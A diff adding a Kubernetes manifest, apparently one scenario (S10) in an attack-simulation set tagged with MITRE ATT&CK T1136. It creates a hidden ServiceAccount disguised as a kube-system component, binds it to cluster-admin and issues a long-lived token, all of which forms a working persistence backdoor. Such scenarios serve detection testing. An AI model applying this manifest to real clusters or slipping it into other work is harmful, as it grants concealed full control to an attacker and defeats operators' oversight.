@@ -1,0 +1,41 @@
+# KOAD-S10: Backdoor ServiceAccount
+# ATT&CK: T1136 — Create Account
+# Attack: Create hidden ServiceAccount bound to cluster-admin
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: system-controller
+  namespace: kube-system
+  labels:
+    koad-scenario: S10
+    mitre-attck: T1136
+  annotations:
+    description: "Backdoor SA disguised as system component"
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: system-controller-binding
+  labels:
+    koad-scenario: S10
+    mitre-attck: T1136
+subjects:
+  - kind: ServiceAccount
+    name: system-controller
+    namespace: kube-system
+roleRef:
+  kind: ClusterRole
+  name: cluster-admin
+  apiGroup: rbac.authorization.k8s.io
+---
+apiVersion: v1
+kind: Secret
+metadata:
+  name: system-controller-token
+  namespace: kube-system
+  labels:
+    koad-scenario: S10
+  annotations:
+    kubernetes.io/service-account.name: system-controller
+type: kubernetes.io/service-account-token
